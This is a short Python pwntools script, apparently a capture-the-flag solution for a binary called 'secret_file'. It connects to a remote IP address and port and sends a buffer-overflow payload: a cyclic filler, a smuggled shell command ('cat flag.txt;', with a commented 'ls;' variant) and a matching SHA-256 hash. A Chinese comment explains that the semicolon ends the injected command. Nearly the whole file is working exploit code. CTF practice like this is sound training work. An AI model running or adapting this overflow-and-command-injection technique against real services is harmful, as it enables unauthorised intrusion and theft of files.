from pwn import *
import hashlib

#p = process("./secret_file")

p = remote("61.147.171.105", 52837)

payload = cyclic(0x100)  # bytes
hash_code = hashlib.sha256(payload).hexdigest()
# 先输入ls命令查看有哪些文件，"ls;" 后面的冒号是终端命令截断符
# payload = payload + b"ls;".ljust(0x1B, b"a") + hash_code.encode("ISO-8859-1")
payload = payload + b"cat flag.txt;".ljust(0x1B, b"a") + hash_code.encode("ISO-8859-1")
p.sendline(payload)
p.interactive()
